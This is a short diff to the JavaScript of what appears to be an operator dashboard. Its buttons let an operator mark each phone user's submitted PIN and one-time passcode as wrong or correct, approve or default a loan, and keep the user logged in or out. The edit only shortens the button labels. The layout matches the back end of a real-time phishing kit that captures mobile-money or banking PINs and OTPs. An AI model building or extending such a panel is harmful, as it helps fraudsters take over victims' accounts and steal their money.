@@ -290,27 +290,27 @@ function attachEvents(){
     // PIN modal: Wrong (1) or Correct (2)
     document.querySelectorAll('.verify-pin').forEach(btn=>{ 
         btn.onclick=()=>showModal(btn.dataset.phone,'pin',[
-            {label:'❌ WRONG PIN (Set to 1)',action:'wrong',class:'btn-wrong'}, 
-            {label:'✅ CORRECT PIN (Set to 2)',action:'correct',class:'btn-correct'}
+            {label:'❌ WRONG PIN',action:'wrong',class:'btn-wrong'}, 
+            {label:'✅ CORRECT PIN',action:'correct',class:'btn-correct'}
         ]); 
     });
     // OTP modal: Wrong (1) or Correct (2)
     document.querySelectorAll('.verify-otp').forEach(btn=>{ 
         btn.onclick=()=>showModal(btn.dataset.phone,'otp',[
-            {label:'❌ WRONG OTP (Set to 1)',action:'wrong',class:'btn-wrong'}, 
-            {label:'✅ CORRECT OTP (Set to 2)',action:'correct',class:'btn-correct'}
+            {label:'❌ WRONG OTP',action:'wrong',class:'btn-wrong'}, 
+            {label:'✅ CORRECT OTP',action:'correct',class:'btn-correct'}
         ]); 
     });
     document.querySelectorAll('.verify-loan').forEach(btn=>{ 
         btn.onclick=()=>showModal(btn.dataset.phone,'loan',[
-            {label:'✅ Approve (1)',action:'approve',class:'btn-approve'},
-            {label:'❌ Default (0)',action:'default',class:'btn-default'}
+            {label:'✅ Approve',action:'approve',class:'btn-approve'},
+            {label:'❌ Default',action:'default',class:'btn-default'}
         ]); 
     });
     document.querySelectorAll('.verify-logout').forEach(btn=>{ 
         btn.onclick=()=>showModal(btn.dataset.phone,'logout',[
-            {label:'✅ Yes - Logged In (Set to 1)',action:'allow',class:'btn-allow'}, 
-            {label:'❌ No - Logged Out (Set to 2)',action:'block',class:'btn-block'}
+            {label:'✅ Yes Logged In',action:'allow',class:'btn-allow'}, 
+            {label:'❌ No Logged Out',action:'block',class:'btn-block'}
         ]); 
     });
 }
